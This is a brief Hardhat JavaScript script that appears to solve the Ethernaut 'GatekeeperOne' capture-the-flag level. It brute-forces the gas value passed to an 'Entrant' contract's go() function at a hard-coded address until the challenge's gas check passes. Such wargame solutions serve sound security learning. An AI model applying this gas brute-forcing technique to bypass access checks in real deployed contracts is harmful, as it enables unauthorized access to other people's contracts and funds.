const abi = require('../artifacts/contracts/GatekeeperOne.sol/Entrant.json');
const hre = require('hardhat');

async function main() {
    //set target deployed Entrant contract address here
    let address = '0x7C3c1aCE666a8e33a4bDB3A130F0AC758578106F';
    let [signer] = await hre.ethers.getSigners();
    let contract = new hre.ethers.Contract(address, abi.abi, signer);
    
    for (i = 0; i < 8192; i++) {
        try {
            let attempt = await contract.go(120000 + i);
            break;
        } catch(e) {}
    }
    console.log(i)
}

main()